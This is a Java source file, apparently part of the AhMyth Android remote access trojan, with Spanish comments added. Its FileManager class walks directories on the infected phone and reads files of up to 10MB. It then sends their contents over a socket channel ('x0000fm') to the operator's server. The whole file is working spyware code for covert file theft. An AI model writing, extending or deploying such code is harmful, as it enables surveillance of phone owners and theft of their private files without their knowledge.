package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * Created by AhMyth on 10/23/16.
 */

public class FileManager {

    // Verifica permiso de lectura de almacenamiento
    private static boolean hasReadPermission(Context context, String path) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Para almacenamiento externo
            if (path.startsWith("/sdcard") || path.startsWith("/storage")) {
                return ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE)
                        == PackageManager.PERMISSION_GRANTED;
            }
        }
        return true;
    }

    public static JSONArray walk(String path) {
        Context context = MainService.getContextOfApplication();
        JSONArray values = new JSONArray();
        File dir = new File(path);

        if (!hasReadPermission(context, path) || !dir.canRead()) {
            Log.d("cannot", "inaccessible");
            JSONObject errObj = new JSONObject();
            try {
                errObj.put("error", "Cannot read directory or permission not granted");
                values.put(errObj);
            } catch (JSONException e) {}
            return values;
        }

        File[] list = dir.listFiles();
        try {
            if (list != null) {
                JSONObject parenttObj = new JSONObject();
                parenttObj.put("name", "../");
                parenttObj.put("isDir", true);
                parenttObj.put("path", dir.getParent());
                values.put(parenttObj);
                for (File file : list) {
                    if (!file.getName().startsWith(".")) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put("path", file.getAbsolutePath());
                        values.put(fileObj);
                    }
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return values;
    }

    public static void downloadFile(String path) {
        Context context = MainService.getContextOfApplication();
        if (path == null) return;

        File file = new File(path);

        if (!hasReadPermission(context, path) || !file.exists() || !file.canRead()) {
            JSONObject errorObj = new JSONObject();
            try {
                errorObj.put("file", false);
                errorObj.put("error", "Cannot read file or permission not granted");
            } catch (JSONException e) {}
            IOSocket.getInstance().getIoSocket().emit("x0000fm", errorObj);
            return;
        }

        int size = (int) file.length();
        // Límite de tamaño: por ejemplo, 10MB (puedes ajustar)
        int MAX_SIZE = 10 * 1024 * 1024;
        if (size > MAX_SIZE) {
            JSONObject errorObj = new JSONObject();
            try {
                errorObj.put("file", false);
                errorObj.put("error", "File too large (" + size + " bytes)");
            } catch (JSONException e) {}
            IOSocket.getInstance().getIoSocket().emit("x0000fm", errorObj);
            return;
        }

        byte[] data = new byte[size];
        try (BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file))) {
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file", true);
            object.put("name", file.getName());
            object.put("buffer", data);
            IOSocket.getInstance().getIoSocket().emit("x0000fm", object);
        } catch (IOException | JSONException e) {
            e.printStackTrace();
            JSONObject errorObj = new JSONObject();
            try {
                errorObj.put("file", false);
                errorObj.put("error", "Download error: " + e.getMessage());
            } catch (JSONException ee) {}
            IOSocket.getInstance().getIoSocket().emit("x0000fm", errorObj);
        }
    }
}